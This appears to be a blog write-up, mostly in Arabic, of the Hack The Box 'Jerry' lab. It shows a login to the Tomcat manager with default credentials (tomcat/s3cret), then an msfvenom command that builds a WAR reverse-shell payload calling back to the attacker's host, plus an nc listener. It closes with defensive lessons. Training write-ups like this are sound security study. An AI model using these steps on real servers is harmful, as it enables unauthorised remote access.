---

title: "HTB Jerry Lab - Arabic Hack The Box Report"
date: 2025-07-28
author: <author_id>
layout: post
categories: Hack_The_Box
tags: [HTB_Repo, Web, Bug_Bounty, File_Upload_Attack ,web_pentest]
direction: rtl
image:
  path: /images/Labs/jerry/1.png
  alt: 
description: 
----

# 1️⃣ HTB Jerry Lab - Arabic Hack The Box Report

---
## 📍 Basic Information
- *Category:* Web
- *Difficulty:* Easy
- *HTB Link:* [HTB Academy – Jerry ](https://app.hackthebox.com/machines/Jerry)
- *Date Completed:* 2025-07-28

---

## 🔍 1. Recon & Enumeration

### 🌐 Target Information
- *IP:* 10.10.10.95
- *Ports:* 8080 (HTTP)
- *Service:* Apache Tomcat
- *Technology Identified:* Apache Tomcat
- *OS Guessing:* Windows

### 📄 Files / Endpoints Discovered
- /docs
- /manager/html
- /examples

### 🧪 Tools Used
- `nmap`, `ffuf`, `msfvenom` 

----

## 🎯 2. Vulnerability Identification

### ✅ Vulnerability Type(s)
- [x] File Upload Attack
- [x] Weak Credential 

### 🧠 Explanation  
<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
اثناء فحص ال Directories وجدت صفحة تسجيل دخول manager/html وهي عبارة عن صفحة تسجيل دخول، قمت بالتسجيل بال username وال password الافتراضيين ل Tomcat، وبالفعل استطعت تسجيل الدخول.
</p>
![[Pasted image 20250728212622.png]]
<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
لاحظت بصفحة ال manager وجود مكان لرفع ملف Web Application Resource (WAR) وهو ملف يحتوي على الملفات المبنية ب Java الضرورية لعمل الموقع.

السماح برفع ملفات WAR وتمكين المستخدم من تشغيلها بدون تحقق من التوثيق يمثل خلل أمني يسمح بتنفيذ أوامر عن بعد RCE، وهذا يُصنف كـ Remote Code Execution.
</p>

---

## 🚀 3. Exploitation

### 🔧 Payload Used
<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">

بعد بحث خفيف على Google وجدت ان ممكن انشأ ال payload باستخدام msvenom : 
</p>

```shell
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.93 LPORT=9002 -f war > rev_shell.war
```
<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">

وطبعاً لازم شغل Listener عندي باستخدام Netcat:
</p>

```shell
nc -lnvp 9002
```


---
### 🎯 Result / Effect
<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">

بعد ما جهزت ال Listener وانشأت ال Payload، برفعه على الصفحة، بس ما رح يصير شي عندي لانه صح انرفع بس ما تم تفعيله، لهيك لازم اضغط على رابط ال Payload يلي تم انشائه:
</p>

![[2.webp]]

---

## 📎 4. Proof of Concept (PoC)

### 💬 Steps to Reproduce:
<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">

1. افتح 8080:[Your_IP] وسجل الدخول بـ:
    
2. بعد الدخول، انتقل مباشرة إلى /manager/html
    - username: tomcat
        
    - password: s3cret
        
    
3. لاحظ ممكن رفع ملف war.
    
4. انشأ payload Java وقم برفعه ثم تشغيله.
    
</p>

### 🖼 Screenshot 

![[3.webp]]

![[4.webp]]

---

## 📊 5. Impact & Risk

<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">

- *OWASP Category:* A08:2021 - Software and Data Integrity Failures , A05:2021 - Security Misconfiguration
    
- *CVSS Score:* 9.0 (Critical)
    
- *Impact:*  
    يسمح للمستخدمين غير المصرح لهم بالوصول إلى صلاحية ال Administrator
    
</p>


---

## 🗒 7. Lessons Learned

<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">

- ضرورة تعطيل واجهات الإدارة (manager/html) أو تقييدها عبر جدار ناري داخلي.
    
- تقييد رفع ملفات WAR لمديرين موثوقين فقط.
    
- فحص ملفات WAR باستخدام AV و sandbox قبل النشر.

</p>    

---

## 🔗 References

- [HTB Academy - File Upload Attacks](https://academy.hackthebox.com/module/details/136)
    
- [OWASP A08 – Software and Data Integrity Failuresl](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
    
- [OWASP A05 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
    

---

## *tags:*

#HTB_Repo , #Web , #Bug_Bounty , #File_Upload_Attack ,#web_pentest